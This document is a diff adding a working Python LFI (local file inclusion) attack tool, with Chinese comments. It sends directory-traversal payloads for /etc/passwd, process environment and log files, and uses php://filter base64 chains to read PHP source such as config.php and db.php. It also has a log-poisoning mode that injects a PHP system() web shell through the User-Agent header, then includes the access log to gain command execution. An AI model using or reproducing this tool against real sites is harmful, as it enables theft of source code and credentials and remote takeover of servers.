@@ -1,0 +1,177 @@
+#!/usr/bin/env python3
+# lfi -- 本地文件包含(LFI)辅助工具（零依赖：python3 stdlib）
+# 功能:
+#   - 自动探测包含点: 目录穿越(../)、php://filter 读源码(base64)、/proc/self 系列
+#   - 生成 php://filter 链(base64 / UTF-7 绕过双层编码)
+#   - 日志投毒探测: 向 User-Agent 注入 PHP 代码, 再包含日志文件
+# 用法:
+#   lfi "http://x/index.php?page={INJ}"                    # 自动探测
+#   lfi "http://x/index.php?page={INJ}" --list             # 只列出 payload 不发送
+#   lfi "http://x/index.php?page={INJ}" --logpoison        # 日志投毒
+#   lfi "http://x/index.php?page={INJ}" --read index.php   # 直接读指定文件源码
+
+import argparse
+import base64
+import sys
+import urllib.parse
+import urllib.request
+
+HDR = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) lfi"}
+
+TRAVERSALS = ["../", "../../", "../../../", "../../../../", "../../../../../"]
+COMMON_FILES = [
+    "etc/passwd", "etc/hostname", "etc/issue", "proc/self/environ",
+    "proc/self/cmdline", "proc/self/status", "proc/version",
+    "var/log/apache2/access.log", "var/log/apache2/error.log",
+    "var/log/nginx/access.log", "var/log/nginx/error.log",
+]
+PHP_FILES = ["index.php", "config.php", "db.php", "flag.php", "upload.php"]
+
+
+def filter_chain(target, depth=0, double=False):
+    """生成 php://filter base64 链, depth=额外 ../ 数, double=True 时 UTF-7 绕过双层"""
+    trav = "../" * depth
+    path = trav + target
+    if double:
+        inner = base64.b64encode(f"php://filter/convert.base64-encode/resource={path}".encode()).decode()
+        return f"php://filter/convert.base64-decode/resource={inner}"
+    return f"php://filter/convert.base64-encode/resource={path}"
+
+
+def make_payloads(target=""):
+    """生成探测 payload 列表 (值, 说明)"""
+    out = []
+    if target:
+        for i in range(6):
+            out.append((filter_chain(target, i), f"filter base64 x{i}"))
+        out.append((f"php://filter/read=convert.base64-encode/resource={target}", "filter 别名"))
+    else:
+        for f in COMMON_FILES:
+            for i in (1, 2, 3):
+                out.append(("../" * i + f, f"traversal x{i}: {f}"))
+        for f in PHP_FILES:
+            for i in (1, 2, 3):
+                out.append((filter_chain(f, i), f"filter x{i}: {f}"))
+        out.append(("php://input", "php://input"))
+        out.append(("data://text/plain,<?php phpinfo();?>", "data:// phpinfo"))
+        out.append(("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "data:// b64 phpinfo"))
+    return out
+
+
+def fetch(base, payload, marker, cookie=""):
+    url = base.replace(marker, urllib.parse.quote(payload, safe="")) if marker in base else base + payload
+    req = urllib.request.Request(url, headers=dict(HDR))
+    if cookie:
+        req.add_header("Cookie", cookie)
+    try:
+        with urllib.request.urlopen(req, timeout=8) as r:
+            return r.status, r.read()
+    except urllib.error.HTTPError as e:
+        return e.code, e.read()
+    except Exception as e:
+        return 0, str(e).encode()
+
+
+def show(url, marker, payload, desc, cookie=""):
+    code, body = fetch(url, payload, marker, cookie)
+    hint = ""
+    if code in (200, 302):
+        hint = ""
+    print(f"[{code}] {desc}: {payload}")
+    return code, body
+
+
+def probe(base, marker, cookie=""):
+    print("[*] LFI 探测开始")
+    hits = 0
+    for payload, desc in make_payloads():
+        code, body = fetch(base, payload, marker, cookie)
+        text = body.decode("utf-8", "replace")
+        if code != 200:
+            print(f"[{code}] {desc}")
+            continue
+        is_hit = False
+        if payload.endswith("passwd") and ("root:" in text or "nobody:" in text):
+            is_hit = True
+        elif "base64" in payload and is_base64ish(text):
+            is_hit = True
+        elif "environ" in payload and "HTTP_" in text:
+            is_hit = True
+        elif "phpinfo" in text:
+            is_hit = True
+        if is_hit:
+            hits += 1
+            print(f"[+] HIT [{code}] {desc}: {payload}")
+            body_dec = try_decode(text)
+            print("    " + body_dec[:600].replace("\n", "\n    "))
+        else:
+            print(f"[{code}] {desc}")
+    print(f"[*] 探测完成, 命中 {hits}")
+
+
+def is_base64ish(text):
+    t = text.strip()[:200]
+    if not t or len(t) < 12:
+        return False
+    import re
+    return bool(re.fullmatch(r"[A-Za-z0-9+/=\s]+", t)) and len(t) % 4 in (0, 2, 3)
+
+
+def try_decode(text):
+    t = text.strip()
+    try:
+        return base64.b64decode(t).decode("utf-8", "replace")
+    except Exception:
+        return t
+
+
+def logpoison(base, marker, cookie=""):
+    code = '<?php system($_GET["c"]);?>'
+    import urllib.request as ur
+    url = base.replace(marker, "/var/log/nginx/access.log")
+    req = ur.Request(url, headers={"User-Agent": code})
+    if cookie:
+        req.add_header("Cookie", cookie)
+    try:
+        with ur.urlopen(req, timeout=8) as r:
+            body = r.read()
+    except urllib.error.HTTPError as e:
+        body = e.read()
+    if b"<?php" in body:
+        print("[+] 日志投毒成功! 日志包含 <?php system() ?>")
+        print(f"    用法: {url.replace('/var/log/nginx/access.log', '')}?c=id")
+    else:
+        print("[-] 日志未包含注入代码(路径可能不对), 试试 /var/log/apache2/access.log")
+    print(body[:300].decode("utf-8", "replace"))
+
+
+def main():
+    ap = argparse.ArgumentParser(prog="lfi", description="LFI 本地文件包含辅助(零依赖)")
+    ap.add_argument("url", help="目标 URL, 包含点用 {INJ} 标记")
+    ap.add_argument("--cookie", default="")
+    ap.add_argument("--list", action="store_true", help="只列出 payload, 不发送")
+    ap.add_argument("--read", metavar="FILE", help="读取指定文件(自动加 filter base64 链)")
+    ap.add_argument("--logpoison", action="store_true", help="日志投毒探测")
+    ap.add_argument("--depth", type=int, default=3, help="--read 时的穿越层数(默认3)")
+    args = ap.parse_args()
+
+    marker = "{INJ}"
+    if args.list:
+        for payload, desc in make_payloads(args.read if args.read else ""):
+            print(f"# {desc}\n{payload}")
+        return
+    if args.read:
+        p = filter_chain(args.read, args.depth)
+        code, body = fetch(args.url, p, marker, args.cookie)
+        print(f"[{code}] {p}")
+        if code == 200:
+            print(try_decode(body.decode("utf-8", "replace")))
+        return
+    if args.logpoison:
+        logpoison(args.url, marker, args.cookie)
+        return
+    probe(args.url, marker, args.cookie)
+
+
+if __name__ == "__main__":
+    main()
